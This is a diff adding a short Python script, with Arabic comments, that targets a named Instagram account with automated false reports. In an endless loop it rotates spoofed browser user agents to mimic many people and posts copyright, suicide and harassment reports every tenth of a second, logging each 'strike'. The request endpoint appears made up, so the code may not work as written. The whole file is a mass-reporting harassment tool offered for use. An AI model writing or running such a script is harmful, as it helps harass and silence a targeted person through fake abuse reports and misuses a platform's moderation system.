@@ -1,0 +1,34 @@
+import requests
+import time
+import random
+
+target = "7i7.m"
+url = f"https://www.instagram.com/{target}/"
+
+# هويات متنوعة لمحاكاة مئات الأشخاص
+agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
+]
+
+print(f"🚨 [SYSTEM OVERLOAD] Initiating Multi-Report Attack on {target}...")
+
+while True:
+    try:
+        headers = {
+            'User-Agent': random.choice(agents),
+            'X-Requested-With': 'XMLHttpRequest'
+        }
+        
+        # بلاغات متنوعة (حقوق ملكية، انتحار، إيذاء)
+        types = ['copyright', 'suicide', 'harassment']
+        for t in types:
+            response = requests.post(f"{url}report/{t}/", headers=headers, timeout=5)
+            if response.status_code == 200:
+                print(f"🔥 Strike [{t.upper()}] Success! Target: {target}")
+            
+    except:
+        pass
+        
+    time.sleep(0.1) # سرعة خيالية
+    
